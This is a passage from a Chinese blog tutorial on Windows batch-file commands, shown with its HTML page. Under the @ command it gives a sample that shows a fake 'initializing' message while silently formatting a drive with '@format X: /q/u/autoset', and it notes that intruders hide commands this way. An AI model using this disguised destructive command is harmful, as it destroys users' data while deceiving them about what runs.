<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>bat文件 | ༺小张博客༻</title><meta name="description" content="batbat文件是dos下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为 .bat 或 .cmd。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用cmd.exe按照该文件中各个命令出现的顺序来逐个运行它们  。使用批处理文件（也被称为批处理程序或脚本），可以简化日常或重复性任务。入侵者常常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及"><meta name="keywords" content="-bat"><meta name="author" content="kali"><meta name="copyright" content="kali"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/kali65536/cdnmovie@master/kali_avator.png"><link rel="canonical" href="https://kali.js.org/2020/08/11/bat%E6%96%87%E4%BB%B6/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta property="og:type" content="article"><meta property="og:title" content="bat文件"><meta property="og:url" content="https://kali.js.org/2020/08/11/bat%E6%96%87%E4%BB%B6/"><meta property="og:site_name" content="༺小张博客༻"><meta property="og:description" content="batbat文件是dos下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为 .bat 或 .cmd。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用cmd.exe按照该文件中各个命令出现的顺序来逐个运行它们  。使用批处理文件（也被称为批处理程序或脚本），可以简化日常或重复性任务。入侵者常常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及"><meta property="og:image" content="https://api.cder.me"><meta property="article:published_time" content="2020-08-11T20:54:14.000Z"><meta property="article:modified_time" content="2021-02-19T10:06:09.121Z"><meta name="twitter:card" content="summary"><link rel="manifest" href="/pwa/manifest.json"><meta name="theme-color" content="#000000"><meta name="msapplication-TileColor" content="#000000"><link rel="apple-touch-icon" sizes="180x180" href="/pwa/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="https://7bu.top/2020/07/27/35a20881f763e.jpg"><link rel="icon" type="image/png" sizes="16x16" href="https://7bu.top/2020/07/27/f17540458cff1.jpg"><link rel="mask-icon" href="/pwa/safari-pinned-tab.svg" color="#5bbad5"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/kali65536/kali65536.github.io/butterflyChange/css/kali.css"><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"簡"},noticeOutdate:void 0,copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},bookmark:{message_prev:"按",message_next:"键将本页加入书签"},runtime_unit:"天",runtime:!1,copyright:void 0,ClickShowText:{text:"爱国,敬业,诚信,友善",fontSize:"15px"},medium_zoom:!1,fancybox:!0,Snackbar:void 0,justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},baiduPush:!1,highlightCopy:!0,highlightLang:!0,isPhotoFigcaption:!1,islazyload:!0,isanchor:!1}</script><script id="config_change">var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1,isHighlightShrink:!1,isSidebar:!0,postUpdate:"2021-02-19 10:06:09"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}</style></noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/kali65536/kali65536.github.io/butterflyChange/css/kali.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/footer.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css"><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="༺小张博客༻" type="application/atom+xml"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="https://cdn.jsdelivr.net/gh/kali65536/cdnmovie@master/kali_avator.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">27</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">27</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">17</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fab fa-readme"></i><span> 個人博客</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://kali.xiaozhang.gq"><i class="fa-fw fa fa-home"></i><span> 个人主页</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.kali65536.gq"><i class="fa-fw fas fa-tools"></i><span> 网页导航</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fa fa-image"></i><span> 照片</span></a></li><li><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></li><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于博主</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="http://j3dwy4.coding-pages.com"><i class="fa-fw fas fa-play"></i><span> 博主视频</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kali-douyin.netlify.app"><i class="fa-fw fas fa-guitar"></i><span> 视频镜像</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-cube"></i><span> 索引</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B/"><i class="fa-fw fab fa-html5"></i><span> 帮你百度一下</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 镜像</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" target="_blank" rel="noopener" href="https://www.guitarist.gq"><i class="fa-fw code-branch"></i><span> coding</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://blog.xiaozhang.gq"><i class="fa-fw code-branch"></i><span> vercel</span></a></li><li><a class="site-page" href="https://kali.js.org"><i class="fa-fw code-branch"></i><span> github</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kali65536.gitee.io"><i class="fa-fw code-branch"></i><span> gitee</span></a></li></ul></div></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bat"><span class="toc-number">1.</span> <span class="toc-text">bat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%BE%91"><span class="toc-number">1.1.</span> <span class="toc-text">编辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%B3%95%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">用法命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#echo-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">echo 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">@ 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#goto-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.3.</span> <span class="toc-text">goto 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rem-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">rem 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pause-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.5.</span> <span class="toc-text">pause 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.6.</span> <span class="toc-text">call 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#start-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.7.</span> <span class="toc-text">start 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#choice-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.8.</span> <span class="toc-text">choice 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#if-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.9.</span> <span class="toc-text">if 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.10.</span> <span class="toc-text">for 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.11.</span> <span class="toc-text">ping命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AT%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.12.</span> <span class="toc-text">AT命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#del%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.13.</span> <span class="toc-text">del命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.14.</span> <span class="toc-text">net命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%89%E9%A1%B9%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">选项语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E9%9B%8F%E5%BD%A2"><span class="toc-number">1.4.</span> <span class="toc-text">代码雏形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">使用参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E5%91%BD%E4%BB%A4"><span class="toc-number">1.6.</span> <span class="toc-text">管道命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">1.7.</span> <span class="toc-text">注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA"><span class="toc-number">1.7.1.</span> <span class="toc-text">创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-number">1.7.2.</span> <span class="toc-text">修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4"><span class="toc-number">1.7.3.</span> <span class="toc-text">删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%AF%B4%E6%98%8E"><span class="toc-number">1.7.4.</span> <span class="toc-text">实例说明</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image:url(https://api.cder.me)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">༺小张博客༻</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fab fa-readme"></i><span> 個人博客</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://kali.xiaozhang.gq"><i class="fa-fw fa fa-home"></i><span> 个人主页</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.kali65536.gq"><i class="fa-fw fas fa-tools"></i><span> 网页导航</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fa fa-image"></i><span> 照片</span></a></li><li><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></li><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于博主</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="http://j3dwy4.coding-pages.com"><i class="fa-fw fas fa-play"></i><span> 博主视频</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kali-douyin.netlify.app"><i class="fa-fw fas fa-guitar"></i><span> 视频镜像</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-cube"></i><span> 索引</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B/"><i class="fa-fw fab fa-html5"></i><span> 帮你百度一下</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 镜像</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" target="_blank" rel="noopener" href="https://www.guitarist.gq"><i class="fa-fw code-branch"></i><span> coding</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://blog.xiaozhang.gq"><i class="fa-fw code-branch"></i><span> vercel</span></a></li><li><a class="site-page" href="https://kali.js.org"><i class="fa-fw code-branch"></i><span> github</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kali65536.gitee.io"><i class="fa-fw code-branch"></i><span> gitee</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">bat文件</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-11T20:54:14.000Z" title="发表于 2020-08-11 20:54:14">2020-08-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-19T10:06:09.121Z" title="更新于 2021-02-19 10:06:09">2021-02-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/dos%E5%91%BD%E4%BB%A4/">dos命令</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="bat"><a href="#bat" class="headerlink" title="bat"></a>bat</h1><p>bat文件是dos下的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理文件/5363369">批处理文件</a>。批处理文件是无格式的文本文件，它包含一条或多条命令。它的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/文件扩展名/1270230">文件扩展名</a>为 .bat 或 .cmd。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用cmd.exe按照该文件中各个命令出现的顺序来逐个运行它们 。使用批处理文件（也被称为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理程序/2192936">批处理程序</a>或脚本），可以简化日常或重复性任务。入侵者常常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能 。</p><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><p>在资源管理器窗口中，如果想双击一个批处理文件名的条目来编辑它而不是来运行它，那么只要将HKEY_ CLASSES_ROOT\batfile\shell右窗口键的“默认”值由“open”改为“edit”，关闭注册表编辑器，这样再双击BAT文件时，就会弹出编辑对话框了 [2] 。</p><h2 id="用法命令"><a href="#用法命令" class="headerlink" title="用法命令"></a>用法命令</h2><p><a href="javascript:;">编辑</a></p><h3 id="echo-命令"><a href="#echo-命令" class="headerlink" title="echo 命令"></a>echo 命令</h3><p>echo命令用于打开回显或关闭请求回显功能，也可用于显示消息。如果没有任何参数，echo命令将显示当前回显设置 [1] 。</p><p>echo的命令格式为“echo [on/off]/[message]”。其中“/”代表选择，“[]”表示类。这条命令的含义代表有3种输出方式：echo on；echo off；echo [message] [1] 。</p><h3 id="命令"><a href="#命令" class="headerlink" title="@ 命令"></a>@ 命令</h3><p>@用于隐藏@后面的命令。批处理文件执行时，在命令行窗口中会显示当前正在运行的命令，为了达到更好的隐蔽性，入侵者可以使用@命令隐藏 [1] 。</p><p>Sample：@echo off</p><p>@echo Now initializing the program,please wait a minite…</p><p>@format X: /q/u/autoset (format 这个命令是不可以使用/y这个参数的，但微软留了autoset这个参数给我们，效果和/y是一样的。）</p><h3 id="goto-命令"><a href="#goto-命令" class="headerlink" title="goto 命令"></a>goto 命令</h3><p>goto命令用于跳转到标签指定的位置并从标签的下一行命令开始执行。命令格式为“goto label”，其中label为标签。标签的名字任意，但是最好是有意义的字母。在字母前需要加“：”号来表示这个字母是标签 [1] 。</p><p>语法：goto label （label是参数，指定所要转向的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理程序">批处理程序</a>中的行。）</p><h3 id="rem-命令"><a href="#rem-命令" class="headerlink" title="rem 命令"></a>rem 命令</h3><p>注释命令，在C语言中相当与/<em>——–</em>/,它并不会被执行，只是起一个注释的作用 [1] ，便于别人阅读和你自己日后修改。</p><p>格式：rem message [1] 。</p><p>Sample：@Rem Here is the description.</p><h3 id="pause-命令"><a href="#pause-命令" class="headerlink" title="pause 命令"></a>pause 命令</h3><p>挂起命令，当批处理文件运行到pause命令时，会出现“请按任意键继续…”的提示 [1] 。</p><p>运行pause 命令时，将显示下面的消息：</p><p>Press any key to <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/continue/2447">continue</a>. . .</p><p>Sample：</p><p>@echo off</p><p>:begin</p><p>copy a:<em>.</em> d：\back</p><p>echo Please put a new disk into driver A</p><p>pause</p><p>goto begin</p><p>在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:\back中。显示的注释提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/任意键">任意键</a>继续处理。</p><h3 id="call-命令"><a href="#call-命令" class="headerlink" title="call 命令"></a>call 命令</h3><p>用于在一个批处理程序中调用另一个批处理程序，此调用过程中只是暂时挂起父批处理程序，当子批处理程序运行完毕后会返回父批处理程序继续执行 [1] 。</p><p>常用的命令格式为“call [path] filename”，其中path是要调用的批处理文件的位置，可选，默认是与父批处理程序在同一目录下；filename用于指定子批处理程序的文件名，其必须包含有．cmd或．bat扩展名 [1] 。</p><p>事实上call命令的格式不止这一种，但不常用，详细情况可以在命令行窗口输入call/?查看 [1] 。</p><p>语法</p><p>call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]</p><p>参数</p><p>[Drive:][Path] FileName</p><p>指定要调用的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理程序">批处理程序</a>的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。</p><h3 id="start-命令"><a href="#start-命令" class="headerlink" title="start 命令"></a>start 命令</h3><p>调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用 [1] 。</p><p>常用参数：</p><p>MIN 开始时窗口最小化</p><p>SEPARATE 在分开的空间内开始 16 位 Windows 程序</p><p>HIGH 在 HIGH 优先级类别开始应用程序</p><p>REALTIME 在 REALTIME 优先级类别开始应用程序</p><p>WAIT 启动应用程序并等候它结束</p><p>parameters 这些为传送到命令/程序的参数 [1]</p><p>执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。</p><h3 id="choice-命令"><a href="#choice-命令" class="headerlink" title="choice 命令"></a>choice 命令</h3><p>choice 使用此命令可以让用户输入一个字符，从而运行不同的命令 [1] 。使用时应该加/c：参数，c：后应写提示可输入的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/字符">字符</a>，之间无空格。它的返回码为1234……</p><p>如： choice /c:dme defrag,mem,end</p><p>将显示</p><p>defrag,mem,end[D,M,E]?</p><p>Sample：</p><p>Sample.bat的内容如下：</p><p>@echo off</p><p>choice /c:dme defrag,mem,end</p><p>if errorlevel 3 goto defrag （应先判断数值最高的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/错误码">错误码</a>）</p><p>if errorlevel 2 goto mem</p><p>if errotlevel 1 goto end</p><p>:defrag</p><p>c:\dos\defrag</p><p>goto end</p><p>:mem</p><p>mem</p><p>goto end</p><p>:end</p><p>echo good bye</p><p>此文件运行后，将显示 defrag,mem,end[D,M,E]? 用户可选择d m e ，然后if语句将作出判断，d表示执行标号为defrag的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/程序段">程序段</a>，m表示执行标号为mem的程序段，e表示执行标号为end的程序段，每个程序段最后都以goto end将程序跳到end标号处，然后程序将显示good bye，文件结束。</p><h3 id="if-命令"><a href="#if-命令" class="headerlink" title="if 命令"></a>if 命令</h3><p>if 表示将判断是否符合规定的条件，从而决定执行不同的命令。有三种格式：</p><p>1.if “参数” == “字符串” 待执行的命令</p><p>参数如果等于指定的字符串，则条件成立，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/运行命令">运行命令</a>，否则运行下一句 [1] 。(注意是两个等号）</p><p>2.if exist 文件名　待执行的命令</p><p>如果有指定的文件，则条件成立，运行命令，否则运行下一句 [1] 。</p><p>如if exist<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/config.sys">config.sys</a>edit config.sys</p><p>3.if errorlevel / if not errorlevel 数字　待执行的命令</p><p>如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句 [1] 。</p><p>如if errorlevel 2 goto x2</p><p>DOS程序运行时都会返回一个数字给DOS，称为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/错误码">错误码</a>errorlevel或称返回码，常见的返回码为0、1 [1] 。</p><h3 id="for-命令"><a href="#for-命令" class="headerlink" title="for 命令"></a>for 命令</h3><p>for命令主要用于循环调用，该命令功能十分强大，有多种调用方法 [1] 。</p><p>for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。</p><p>在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理文件">批处理文件</a>中使用 FOR 命令时，指定变量请使用 %%variable</p><p>filenameset 为一个或多个文件名。继续到 filenameset 中的下一个文件之前，每份文件都已被打开、读取并经过处理。处理包括读取文件，将其分成一行行的文字，然后将每行解析成零或更多的符号。然后用已找到的符号字符串变量值调用 For 循环。以默认方式，/F 通过每个文件的每一行中分开的第一个空白符号。跳过空白行。您可通过指定可选 “options”参数替代默认解析操作。这个带引号的字符串包括一个或多个指定不同解析选项的关键字。这些关键字为：eol=c - 指一个行注释字符的结尾（就一个）。skip=n - 指在文件开始时忽略的行数。delims=xxx - 指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/分隔符">分隔符</a>集。这个替换了空格和跳格键的</p><p>默认分隔符集。</p><p>tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的格式为一个范围。通过 nth 符号指定 m符号<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/字符">字符</a>串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之分配并接受行的保留文本。</p><p>usebackq - 指定新语法已在下类情况中使用：</p><p>在作为命令执行一个后引号的字符串并且引号字符为文字字符串命令并允许在 fi中使用双引号扩起文件名称。</p><p>sample1:</p><p>FOR /F “eol=; tokens=2,3* delims=,” %i in (myfile.txt) do command</p><p>会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。%i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 z 或Z 的变量。请记住，FOR变量是单一字母、分大小写和全局的；同时不能有 52 个以上都在使用中。</p><p>您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的 filenameset 括起来。这样，该字符串会被当作一个文件中的一个单一输入行。最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将括号之间的 filenameset 变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。</p><p>因此，以下例子：</p><p>FOR /F “usebackq delims==” %i IN (<code>set</code>) DO @echo %i</p><p>会枚举当前环境中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/环境变量">环境变量</a>名称。</p><h3 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h3><p>Ping命令可以测试计算机名和计算机的IP地址，严正与对方计算机的连接，通过向对方<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/主机">主机</a>发送“网际消息控制协议 (ICMP）”回响请求消息来验证与对方 TCP/IP 计算机的 